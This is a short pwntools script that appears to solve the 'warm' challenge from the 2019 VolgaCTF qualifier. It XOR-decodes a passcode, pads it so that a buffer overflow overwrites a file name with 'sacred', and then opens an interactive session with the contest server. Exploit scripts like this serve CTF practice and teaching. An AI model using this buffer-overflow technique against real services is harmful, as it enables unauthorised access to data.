#!/usr/bin/env python
from pwn import *
r = remote('warm.q.2019.volgactf.ru', 443)
enc = [0x76, 0x4e, 0x1e, 0x15, 0x5e, 0x1c, 0x21, 1, 0x34, 7, 0x35, 0x11, 0x37, 0x3c, 0x72, 0x47]
passcode = chr(enc[0])
last = enc[0]
for i in range(1, len(enc)):
    val = last ^ enc[i]
    passcode += chr(val)
    last = val
print passcode
payload = passcode.ljust(100, 'a') + 'sacred'
print payload
r.sendline(payload)
r.interactive()
